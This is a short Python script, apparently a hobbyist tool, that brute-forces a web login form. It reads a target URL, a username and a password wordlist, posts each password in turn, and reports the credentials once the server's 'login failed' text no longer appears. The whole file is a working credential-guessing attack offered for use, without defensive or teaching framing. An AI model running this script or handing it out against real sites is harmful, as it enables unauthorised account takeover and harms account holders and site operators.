import requests

url = input("[+] Enter the URL: ")
username = input("[+] Enter the username for the acc to bruteforce: ")
password_file = input("[+] Enter the path to the password file: ")
login_failed_string = input("[+] Enter the login failed string: ")


def cracking(username, url):
    with open(password_file, "r") as passwords:
        for password in passwords:
            password = password.strip()
            print(f"[+] Attempting to bruteforce {username} with password: {password}")
            data = {
                "username": username,
                "password": password,
                "Login": "submit",
            }
            response = requests.post(url, data=data)
            if login_failed_string in response.content.decode():
                pass
            else:
                print(f"[+] username found: {username}")
                print(f"[+] password found: {password}")
                exit()


cracking(username, url)

print("[-] No username found!")
print("[-] No password found!")
